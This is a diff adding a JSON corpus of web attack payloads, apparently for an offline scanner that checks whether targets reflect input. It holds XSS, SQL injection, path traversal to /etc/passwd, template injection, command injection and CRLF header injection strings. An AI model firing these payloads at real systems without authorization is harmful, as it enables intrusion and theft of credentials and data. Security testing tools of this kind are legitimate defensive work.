@@ -1,0 +1,78 @@
+{
+  "_meta": {
+    "purpose": "Vendored, offline reflection-payload corpus. Raw attack strings; the loader (app/engine/payload_corpus.py) inserts the aidx marker and shapes each into a Payload. Every entry must carry a neutralizable metacharacter so a correctly-encoding target does not echo it verbatim.",
+    "provenance": "Curated subset in the style of PayloadsAllTheThings (MIT) and FuzzDB (attack corpora). Benign reflection probes only, never exploitation.",
+    "families": "Must map to app/engine/payloads.py FAMILIES."
+  },
+  "xss": [
+    "<script>confirm(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "\"><script>alert(1)</script>",
+    "'><img src=x onerror=alert(1)>",
+    "<body onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>",
+    "<a href=\"javascript:alert(1)\">x</a>",
+    "<details open ontoggle=alert(1)>",
+    "<input autofocus onfocus=alert(1)>",
+    "\"><svg><animate onbegin=alert(1) attributeName=x>",
+    "<img src=1 href=1 onerror=\"javascript:alert(1)\">",
+    "<marquee onstart=alert(1)>",
+    "javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>"
+  ],
+  "sqli": [
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "\" OR \"1\"=\"1",
+    "1' ORDER BY 1--",
+    "1' UNION SELECT NULL--",
+    "' AND 1=CONVERT(int,@@version)--",
+    "') OR ('1'='1",
+    "1;WAITFOR DELAY '0:0:0'--",
+    "admin'--",
+    "' OR 1=1#",
+    "\" UNION SELECT username,password FROM users--",
+    "1' AND '1'='2"
+  ],
+  "traversal": [
+    "../../../../etc/passwd",
+    "..%2f..%2f..%2fetc%2fpasswd",
+    "....//....//....//etc/passwd",
+    "..\\..\\..\\windows\\win.ini",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "/etc/passwd%00",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "file:///etc/passwd"
+  ],
+  "ssti": [
+    "${7*7}",
+    "{{7*7}}",
+    "#{7*7}",
+    "<%= 7*7 %>",
+    "${{7*7}}",
+    "{{7*'7'}}",
+    "#{ 7 * 7 }",
+    "${T(java.lang.Runtime)}",
+    "{{config.items()}}",
+    "*{7*7}"
+  ],
+  "cmdi": [
+    ";id",
+    "|id",
+    "&&id",
+    "`id`",
+    "$(id)",
+    "; sleep 0",
+    "| whoami",
+    "%0aid",
+    "&& cat /etc/passwd",
+    "|| ping -c 1 127.0.0.1"
+  ],
+  "crlf": [
+    "%0d%0aSet-Cookie:injected=1",
+    "%0d%0aX-Injected:1",
+    "%0aX-Injected:1",
+    "%0d%0a%0d%0a<injected>",
+    "%E5%98%8A%E5%98%8DX-Injected:1"
+  ]
+}
